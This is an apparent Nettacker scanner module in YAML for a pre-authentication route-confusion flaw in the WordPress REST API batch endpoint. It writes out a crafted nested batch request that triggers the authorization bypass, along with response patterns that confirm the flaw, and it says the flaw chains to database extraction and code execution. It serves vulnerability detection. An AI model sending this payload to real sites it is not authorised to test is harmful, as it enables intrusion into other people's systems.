info:
  name: wordpress_core_cve_2026_63030_vuln
  author: Nettacker Team
  severity: 9.8
  description: |
    WordPress Core versions 6.9.0 through 6.9.4 and 7.0.0 through 7.0.1 are
    vulnerable to a pre-authentication route confusion flaw in the REST API
    batch endpoint (/?rest_route=/batch/v1). A specially crafted nested batch
    request can desynchronize the batch router, allowing unauthenticated
    requests to reach unintended REST API handlers and bypass authorization
    checks. This vulnerability can be chained with CVE-2026-60137 to enable
    unauthenticated database extraction and may ultimately lead to remote code
    execution.

  reference:
    - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q
    - https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core
  profiles:
    - http
    - vuln
    - wordpress
    - cve
    - cve2026
    - critical_severity
    - cisa_kev

payloads:
  - library: http
    steps:
      - method: post
        timeout: 5
        allow_redirects: false
        ssl: false

        headers:
          User-Agent: "{user_agent}"
          Host: "{target}"
          Content-Type: "application/json"

        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
                - 8080
                - 8443
              paths:
                - "/?rest_route=/batch/v1"
                - "/wp-json/batch/v1"

        data: |
          {{"validation":"normal","requests":[{{"method":"POST","path":"http://:"}},{{"method":"DELETE","path":"/wp/v2/categories/0"}},{{"method":"POST","path":"/wp/v2/block-renderer/core/paragraph"}}]}}
        response:
          condition_type: and
          conditions:
            status_code:
              regex: "207"
              reverse: false

            headers:
              Content-type: 
                regex: "application/json"
                reverse: false

            content:
              regex: "(?s)(?=.*block_cannot_read)(?!.*rest_term_invalid)"
              reverse: false